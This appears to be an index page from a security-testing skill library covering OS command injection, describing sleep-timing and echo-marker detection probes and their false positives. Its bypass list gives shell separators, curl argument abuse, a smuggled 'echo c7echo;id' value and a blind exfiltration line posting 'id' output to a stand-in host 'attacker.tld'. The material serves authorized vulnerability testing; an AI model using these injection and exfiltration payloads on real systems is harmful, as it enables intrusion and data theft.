# OS Command Injection

**CWE-78, MITRE T1059.004** · 2 skill(s) · folder `categories/command_injection/`

## Skills in this shelf

- `web/Command injection time-based sleep oracle` (CWE-78)
- `web/Command injection output echo marker` (CWE-78)

## Technique

Host-tool argument injection (ping/dig forms): time-based sleep oracle (identical twins differing only in sleep 0 vs sleep 6) and output-echo marker (`echo c7echo;id`).

## Proof design (why it is falsifiable)

latency_delta isolates shell execution from network noise exactly like the SQLi twin design; echo marker confirms direct stdout rendering. Benign (no separator) stays fast and marker-free.

## Bypass variants / escalation ("think more beats level")

- Separator matrix: ; | && || \n $() ``
- Argument-injection (no separator): --upload-file, --config abuse in curl/wrapper tools
- Blind exfil: $(id | curl -X POST -d @- attacker.tld)
- Windows siblings: & timeout, %PATH% expansion
- Restricted-shell escapes when a tool wrapper exists

## Sources (copied & rewritten into our proof-first DSL)

- swisskyrepo/PayloadsAllTheThings — OS Command Injection
- commixproject/commix — vector taxonomy

## False positives to rule out

Queue-based tools that reply instantly then execute later — the echo marker (not just timing) discriminates; report timing-only as suspected.
